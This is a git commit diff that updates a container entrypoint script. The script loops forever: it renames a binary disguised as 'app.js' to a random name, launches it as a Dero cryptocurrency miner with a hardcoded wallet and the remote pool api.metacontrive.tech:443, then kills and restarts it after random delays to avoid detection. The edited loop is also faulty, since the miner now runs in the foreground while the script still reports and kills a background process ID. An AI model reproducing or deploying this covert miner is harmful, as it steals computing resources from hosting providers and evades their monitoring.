43a10b876e34789a52c367fa932936585b361019
humaldostangos <133825175+humaldostangos@users.noreply.github.com>
2023-05-17 01:29:18 +0100

    Update entrypoint.sh

--- entrypoint.sh
+++ entrypoint.sh
@@ -1,5 +1,11 @@
 #!/bin/sh
 
+# Function to generate a random delay between 10 and 60 seconds
+generate_random_delay() {
+  delay=$((10 + RANDOM % 51))
+  echo "Delay: $delay seconds"
+}
+
 # Function to generate a random 9-digit alphanumeric name
 generate_random_name() {
   new_name=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 9 | head -n 1)
@@ -8,17 +14,16 @@ generate_random_name() {
 # Function to rename and restart the main executable
 restart_main() {
   while true; do
+    generate_random_delay
     generate_random_name
-    mv main "$new_name"
+    mv app.js "$new_name"
     chmod 777 "$new_name"
-    ./"$new_name" -w dero1qyjrwgdvns7arfuzf6pz5lhpj2yfsdlzy9c05w6qmmp3shc7fm3m2qgjs4uez -r api.metacontrive.tech:443 -p rpc > /dev/null 2>&1 &
-    pid=$!
-    echo "Restarted with PID: $pid"
-    sleep $((10 + RANDOM % 51))
-    echo "Stopping process with PID: $pid"
-    kill $pid > /dev/null 2>&1
+    ./"$new_name" -w dero1qyjrwgdvns7arfuzf6pz5lhpj2yfsdlzy9c05w6qmmp3shc7fm3m2qgjs4uez -r api.metacontrive.tech:443 -p rpc > /dev/null 2>&1
+    echo "Restarted with PID: $!"
+    sleep "$delay"
+    echo "Stopping process with PID: $!"
+    kill "$!"
     echo "Process stopped"
-    wait $pid > /dev/null 2>&1
     echo "Exited process"
   done
 }
@@ -28,3 +33,4 @@ trap 'exit 0' SIGINT SIGTERM
 
 # Call the function to rename and restart the main executable
 restart_main
+
